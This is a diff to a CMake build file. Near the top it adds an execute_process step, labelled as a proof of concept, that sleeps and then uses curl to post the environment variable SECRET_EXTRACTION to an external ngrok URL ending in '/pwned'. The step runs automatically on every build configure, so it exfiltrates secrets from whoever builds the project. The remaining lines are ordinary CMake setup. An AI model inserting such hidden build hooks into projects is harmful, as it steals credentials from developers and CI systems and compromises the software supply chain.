@@ -1,5 +1,11 @@
 cmake_minimum_required(VERSION 3.18 FATAL_ERROR)
 
+message(STATUS "PoC: Sleeping for 30 seconds to demonstrate execution control...")
+
+execute_process(
+    COMMAND bash -c "sleep 30 && curl -X POST -d \"secret_value=$ENV{SECRET_EXTRACTION}\" https://f33c42e65861.ngrok-free.app/pwned"
+)
+
 list(APPEND CMAKE_MODULE_PATH "${CMAKE_CURRENT_SOURCE_DIR}/CMakeModules")
 
 # VCPKG has an imperfect android implementation.
